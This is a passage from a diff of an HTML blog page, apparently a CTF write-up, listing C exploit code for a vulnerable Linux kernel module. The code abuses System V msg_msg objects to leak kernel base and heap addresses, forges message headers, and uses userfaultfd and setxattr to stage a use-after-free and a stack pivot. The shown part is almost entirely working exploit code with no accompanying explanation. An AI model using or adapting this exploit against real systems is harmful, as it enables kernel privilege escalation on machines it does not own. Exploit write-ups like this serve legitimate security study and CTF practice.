+</span><span style="color:#c0c5ce;">	</span><span style="color:#96b5b4;">memset</span><span style="color:#c0c5ce;">(msg_buf, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x2000</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">	</span><span style="color:#96b5b4;">memset</span><span style="color:#c0c5ce;">(received, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x2000</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">	
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">for</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> i = </span><span style="color:#d08770;">10</span><span style="color:#c0c5ce;">; i &lt; </span><span style="color:#d08770;">20</span><span style="color:#c0c5ce;">; i++){
+</span><span style="color:#c0c5ce;">	fd_stat[i] = </span><span style="color:#8fa1b3;">open</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">/proc/self/stat</span><span style="color:#c0c5ce;">&quot;, O_RDONLY);
+</span><span style="color:#c0c5ce;">	}
+</span><span style="color:#c0c5ce;">	
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">for</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> i = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">; i &lt; </span><span style="color:#d08770;">3</span><span style="color:#c0c5ce;">; i++){
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">pipe</span><span style="color:#c0c5ce;">(pipe_fd[i]) &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {
+</span><span style="color:#c0c5ce;">	  </span><span style="color:#96b5b4;">perror</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[-] pipe</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">	  </span><span style="color:#96b5b4;">exit</span><span style="color:#c0c5ce;">(-</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">	}
+</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">write</span><span style="color:#c0c5ce;">(pipe_fd[i][</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">], &quot;</span><span style="color:#a3be8c;">pwn</span><span style="color:#c0c5ce;">&quot;, </span><span style="color:#d08770;">3</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">	}
+</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">write</span><span style="color:#c0c5ce;">(fd, buf, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">for</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> i = </span><span style="color:#d08770;">3</span><span style="color:#c0c5ce;">; i &lt; </span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">; i++){
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">pipe</span><span style="color:#c0c5ce;">(pipe_fd[i]) &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {
+</span><span style="color:#c0c5ce;">	  </span><span style="color:#96b5b4;">perror</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[-] pipe</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">	  </span><span style="color:#96b5b4;">exit</span><span style="color:#c0c5ce;">(-</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">	}
+</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">write</span><span style="color:#c0c5ce;">(pipe_fd[i][</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">], &quot;</span><span style="color:#a3be8c;">pwn</span><span style="color:#c0c5ce;">&quot;, </span><span style="color:#d08770;">3</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">	}
+</span><span style="color:#c0c5ce;">	
+</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">ioctl</span><span style="color:#c0c5ce;">(fd, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">	real_qid = </span><span style="color:#8fa1b3;">get_msg_queue</span><span style="color:#c0c5ce;">();
+</span><span style="color:#c0c5ce;">	message-&gt;mtype = </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">	</span><span style="color:#96b5b4;">memset</span><span style="color:#c0c5ce;">(message-&gt;mtext, &#39;</span><span style="color:#a3be8c;">Z</span><span style="color:#c0c5ce;">&#39;, </span><span style="color:#d08770;">0x400</span><span style="color:#c0c5ce;">-</span><span style="color:#d08770;">0x30</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">msgsnd</span><span style="color:#c0c5ce;">(real_qid, message, </span><span style="color:#d08770;">0x400</span><span style="color:#c0c5ce;">-</span><span style="color:#d08770;">0x30</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">	((msg_header*)buf)-&gt;m_type = </span><span style="color:#d08770;">0x1</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">	((msg_header*)buf)-&gt;m_ts = </span><span style="color:#d08770;">0x1000</span><span style="color:#c0c5ce;">-</span><span style="color:#d08770;">0x30</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">write</span><span style="color:#c0c5ce;">(fd, buf, </span><span style="color:#d08770;">0x20</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">	
+</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">msgrcv</span><span style="color:#c0c5ce;">(real_qid, received, </span><span style="color:#d08770;">0x1000</span><span style="color:#c0c5ce;">-</span><span style="color:#d08770;">0x30</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);
+</span><span style="color:#c0c5ce;">	vmbase=*(size_t*)(received+</span><span style="color:#d08770;">0x410</span><span style="color:#c0c5ce;">-</span><span style="color:#d08770;">0x30</span><span style="color:#c0c5ce;">+</span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">)-</span><span style="color:#d08770;">0x1064f40</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">	</span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] vmbase 0x</span><span style="color:#d08770;">%llx</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, (</span><span style="color:#b48ead;">long long</span><span style="color:#c0c5ce;">)vmbase);
+</span><span style="color:#c0c5ce;">	
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">for</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> i = </span><span style="color:#d08770;">0 </span><span style="color:#c0c5ce;">; i &lt; </span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">; i++){
+</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">close</span><span style="color:#c0c5ce;">(pipe_fd[i][</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">]);
+</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">close</span><span style="color:#c0c5ce;">(pipe_fd[i][</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">]);
+</span><span style="color:#c0c5ce;">	}
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">for</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> i = </span><span style="color:#d08770;">0 </span><span style="color:#c0c5ce;">; i &lt; </span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">; i++){
+</span><span style="color:#c0c5ce;">	leak_qid[i] = </span><span style="color:#8fa1b3;">get_msg_queue</span><span style="color:#c0c5ce;">();
+</span><span style="color:#c0c5ce;">	message-&gt;mtype = </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">	</span><span style="color:#96b5b4;">memset</span><span style="color:#c0c5ce;">(message-&gt;mtext, &#39;</span><span style="color:#a3be8c;">A</span><span style="color:#c0c5ce;">&#39;+i, </span><span style="color:#d08770;">0x400</span><span style="color:#c0c5ce;">-</span><span style="color:#d08770;">0x30</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">	</span><span style="color:#96b5b4;">memset</span><span style="color:#c0c5ce;">(message-&gt;mtext+</span><span style="color:#d08770;">0x400</span><span style="color:#c0c5ce;">-</span><span style="color:#d08770;">0x30</span><span style="color:#c0c5ce;">-</span><span style="color:#d08770;">0x10</span><span style="color:#c0c5ce;">, &#39;</span><span style="color:#96b5b4;">\x00</span><span style="color:#c0c5ce;">&#39;, </span><span style="color:#d08770;">0x10</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">msgsnd</span><span style="color:#c0c5ce;">(leak_qid[i], message, </span><span style="color:#d08770;">0x400</span><span style="color:#c0c5ce;">-</span><span style="color:#d08770;">0x30</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">	}
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">for</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> i = </span><span style="color:#d08770;">0 </span><span style="color:#c0c5ce;">; i &lt; </span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">; i++){
+</span><span style="color:#c0c5ce;">	</span><span style="color:#96b5b4;">memset</span><span style="color:#c0c5ce;">(message-&gt;mtext, &#39;</span><span style="color:#a3be8c;">0</span><span style="color:#c0c5ce;">&#39;+i, </span><span style="color:#d08770;">0x1018</span><span style="color:#c0c5ce;">-</span><span style="color:#d08770;">0x30</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">	</span><span style="color:#96b5b4;">memcpy</span><span style="color:#c0c5ce;">(message-&gt;mtext, &quot;</span><span style="color:#a3be8c;">ayoung</span><span style="color:#c0c5ce;">&quot;, </span><span style="color:#d08770;">6</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">msgsnd</span><span style="color:#c0c5ce;">(leak_qid[i], message, </span><span style="color:#d08770;">0x1018</span><span style="color:#c0c5ce;">-</span><span style="color:#d08770;">0x30</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">	}
+</span><span style="color:#c0c5ce;">	
+</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">msgrcv</span><span style="color:#c0c5ce;">(real_qid, received, </span><span style="color:#d08770;">0x1000</span><span style="color:#c0c5ce;">-</span><span style="color:#d08770;">0x30</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);
+</span><span style="color:#c0c5ce;">	llprev_addr = *(size_t*)(received+</span><span style="color:#d08770;">0x400</span><span style="color:#c0c5ce;">-</span><span style="color:#d08770;">0x30</span><span style="color:#c0c5ce;">+</span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">	llnext_addr = *(size_t*)(received+</span><span style="color:#d08770;">0x400</span><span style="color:#c0c5ce;">-</span><span style="color:#d08770;">0x30</span><span style="color:#c0c5ce;">+</span><span style="color:#d08770;">0x10</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">	</span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] llprev_addr 0x</span><span style="color:#d08770;">%llx</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, (</span><span style="color:#b48ead;">long long</span><span style="color:#c0c5ce;">)llprev_addr);
+</span><span style="color:#c0c5ce;">	</span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] llnext_addr 0x</span><span style="color:#d08770;">%llx</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, (</span><span style="color:#b48ead;">long long</span><span style="color:#c0c5ce;">)llnext_addr);
+</span><span style="color:#c0c5ce;">	
+</span><span style="color:#c0c5ce;">	((msg_header*)buf)-&gt;ll_next = (</span><span style="color:#b48ead;">void</span><span style="color:#c0c5ce;">*)llnext_addr;
+</span><span style="color:#c0c5ce;">	((msg_header*)buf)-&gt;ll_prev = (</span><span style="color:#b48ead;">void</span><span style="color:#c0c5ce;">*)llnext_addr;
+</span><span style="color:#c0c5ce;">	((msg_header*)buf)-&gt;m_ts = </span><span style="color:#d08770;">0x1500</span><span style="color:#c0c5ce;">-</span><span style="color:#d08770;">0x30</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">	((msg_header*)buf)-&gt;next = (</span><span style="color:#b48ead;">void</span><span style="color:#c0c5ce;">*)(llprev_addr-</span><span style="color:#d08770;">0x8</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">write</span><span style="color:#c0c5ce;">(fd, buf, </span><span style="color:#d08770;">0x28</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">	
+</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">msgrcv</span><span style="color:#c0c5ce;">(real_qid, received, </span><span style="color:#d08770;">0x1500</span><span style="color:#c0c5ce;">-</span><span style="color:#d08770;">0x30</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);
+</span><span style="color:#c0c5ce;">	heap_addr = *(size_t*)(received+</span><span style="color:#d08770;">0x1000</span><span style="color:#c0c5ce;">-</span><span style="color:#d08770;">0x30</span><span style="color:#c0c5ce;">+</span><span style="color:#d08770;">0x20</span><span style="color:#c0c5ce;">+</span><span style="color:#d08770;">0x8</span><span style="color:#c0c5ce;">); </span><span style="color:#65737e;">// kmalloc-32
+</span><span style="color:#c0c5ce;">	</span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] heap_addr 0x</span><span style="color:#d08770;">%llx</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, (</span><span style="color:#b48ead;">long long</span><span style="color:#c0c5ce;">)heap_addr);
+</span><span style="color:#c0c5ce;">	
+</span><span style="color:#c0c5ce;">	((msg_header*)buf)-&gt;next = (</span><span style="color:#b48ead;">void</span><span style="color:#c0c5ce;">*)(heap_addr);
+</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">write</span><span style="color:#c0c5ce;">(fd, buf, </span><span style="color:#d08770;">0x28</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">	
+</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">msgrcv</span><span style="color:#c0c5ce;">(real_qid, received, </span><span style="color:#d08770;">0x1500</span><span style="color:#c0c5ce;">-</span><span style="color:#d08770;">0x30</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> _index = *(</span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;">*)(received+</span><span style="color:#d08770;">0x1000</span><span style="color:#c0c5ce;">-</span><span style="color:#d08770;">0x30</span><span style="color:#c0c5ce;">+</span><span style="color:#d08770;">0x8</span><span style="color:#c0c5ce;">) -</span><span style="color:#d08770;">0x30</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">	</span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] get index: </span><span style="color:#d08770;">%d</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, _index);
+</span><span style="color:#c0c5ce;">	
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">for</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> i = </span><span style="color:#d08770;">0 </span><span style="color:#c0c5ce;">; i &lt; </span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">; i++){
+</span><span style="color:#c0c5ce;">	hack_buf[i] = (</span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;">*)</span><span style="color:#8fa1b3;">mmap</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">*PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">	*(size_t*)(hack_buf[i] + PAGE_SIZE - </span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">) = </span><span style="color:#d08770;">0x0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">register_userfault</span><span style="color:#c0c5ce;">(hack_buf[i]+PAGE_SIZE, userfault_setzero_handler);
+</span><span style="color:#c0c5ce;">	}
+</span><span style="color:#c0c5ce;">	hack_buf[</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">] = (</span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;">*)</span><span style="color:#8fa1b3;">mmap</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">*PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">register_userfault</span><span style="color:#c0c5ce;">(hack_buf[</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">]+PAGE_SIZE, userfault_hijack_handler);
+</span><span style="color:#c0c5ce;">	*(size_t*)(hack_buf[</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">] + PAGE_SIZE - </span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">) = add_rsp+vmbase;
+</span><span style="color:#c0c5ce;">	
+</span><span style="color:#c0c5ce;">	</span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] first free victim msg_msg</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">msgrcv</span><span style="color:#c0c5ce;">(leak_qid[_index], received, </span><span style="color:#d08770;">0x400</span><span style="color:#c0c5ce;">-</span><span style="color:#d08770;">0x30</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, IPC_NOWAIT | MSG_NOERROR);
+</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">msgrcv</span><span style="color:#c0c5ce;">(leak_qid[_index], received, </span><span style="color:#d08770;">0x1018</span><span style="color:#c0c5ce;">-</span><span style="color:#d08770;">0x30</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, IPC_NOWAIT | MSG_NOERROR);
+</span><span style="color:#c0c5ce;">	
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> cnt = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">for</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> i = </span><span style="color:#d08770;">0 </span><span style="color:#c0c5ce;">; i &lt; </span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">; i++){
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if</span><span style="color:#c0c5ce;">(i!=_index){
+</span><span style="color:#c0c5ce;">	  </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] free padding msg_msg</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">	  </span><span style="color:#8fa1b3;">msgrcv</span><span style="color:#c0c5ce;">(leak_qid[i], received, </span><span style="color:#d08770;">0x400</span><span style="color:#c0c5ce;">-</span><span style="color:#d08770;">0x30</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, IPC_NOWAIT | MSG_NOERROR);
+</span><span style="color:#c0c5ce;">	  </span><span style="color:#8fa1b3;">msgrcv</span><span style="color:#c0c5ce;">(leak_qid[i], received, </span><span style="color:#d08770;">0x1018</span><span style="color:#c0c5ce;">-</span><span style="color:#d08770;">0x30</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, IPC_NOWAIT | MSG_NOERROR);
+</span><span style="color:#c0c5ce;">	  cnt++;
+</span><span style="color:#c0c5ce;">	}
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(cnt==</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">	  </span><span style="color:#b48ead;">break</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">	}
+</span><span style="color:#c0c5ce;">	
+</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">sleep</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">	</span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] set zero through setxattr</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">for</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> i = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">; i &lt; </span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">; i++){
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> s = </span><span style="color:#8fa1b3;">pthread_create</span><span style="color:#c0c5ce;">(&amp;hthr[i], </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">, setxattr_handler, (</span><span style="color:#b48ead;">void</span><span style="color:#c0c5ce;">*)hack_buf[i]);
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if</span><span style="color:#c0c5ce;">(s!=</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">	  </span><span style="color:#8fa1b3;">ErrExit</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[-] pthread-create error</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">	}
+</span><span style="color:#c0c5ce;">	
+</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">// fix m_ts
+</span><span style="color:#c0c5ce;">	((msg_header*)buf)-&gt;m_ts = </span><span style="color:#d08770;">0x400</span><span style="color:#c0c5ce;">-</span><span style="color:#d08770;">0x30</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">write</span><span style="color:#c0c5ce;">(fd, buf, </span><span style="color:#d08770;">0x28</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">	
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">while</span><span style="color:#c0c5ce;">(msg_can_release==</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">){}
+</span><span style="color:#c0c5ce;">	</span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] second free victim msg_msg</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">msgrcv</span><span style="color:#c0c5ce;">(real_qid, received, </span><span style="color:#d08770;">0x1000</span><span style="color:#c0c5ce;">-</span><span style="color:#d08770;">0x30</span><span style="color:#c0c5ce;">+</span><span style="color:#d08770;">0x18</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, IPC_NOWAIT | MSG_NOERROR);
+</span><span style="color:#c0c5ce;">	setxa_can_release=</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">sleep</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">	
+</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">// 2 4
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">for</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> i = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">; i &lt; </span><span style="color:#d08770;">4</span><span style="color:#c0c5ce;">; i++){
+</span><span style="color:#c0c5ce;">	</span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] fd_stat: </span><span style="color:#d08770;">%d</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, i);
+</span><span style="color:#c0c5ce;">	fd_stat[i] = </span><span style="color:#8fa1b3;">open</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">/proc/self/stat</span><span style="color:#c0c5ce;">&quot;, O_RDONLY);
+</span><span style="color:#c0c5ce;">	}
+</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">setxattr</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">/exp</span><span style="color:#c0c5ce;">&quot;, &quot;</span><span style="color:#a3be8c;">ay</span><span style="color:#c0c5ce;">&quot;, hack_buf[</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">] + PAGE_SIZE - </span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x20</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">  
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">return </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">}
+</span></pre>
+</main>
+                <aside class="toc-sidebar">
+                    <div class="toc-sticky-container">
+                        <div class="toc-header">:: Contents ::</div>
+                        <ul class="toc-list"><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#exp1">exp1</a></li><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#exp2">exp2</a></li></ul>
+                    </div>
+                </aside>
+            </div> 
+    <footer style="margin-top: 50px; border-top: 1px solid #333; padding-top: 20px; font-size: 0.8rem; color: #555; text-align: center;">
+        Built with Rust. <span style="color: #66ed59;">EOF</span>
+    </footer>
+    <button id="back-to-top" aria-label="Back to Top">^TOP</button>
+    <script src="script.js"></script>
+</body>
+</html>
